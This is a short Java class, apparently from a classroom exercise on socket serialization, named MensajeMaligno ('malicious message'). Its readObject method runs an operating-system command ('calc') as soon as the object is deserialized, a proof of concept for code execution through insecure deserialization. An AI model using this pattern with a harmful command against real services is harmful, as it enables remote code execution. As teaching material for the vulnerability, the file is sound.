package sokects_serializable;

import java.io.IOException;
import java.io.Serializable;

public class MensajeMaligno implements Serializable {

	/**
	 * 
	 */
	private static final long serialVersionUID = 1L;
	
	private void readObject(java.io.ObjectInputStream in) {
		try {
			Runtime.getRuntime().exec("calc");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	

}
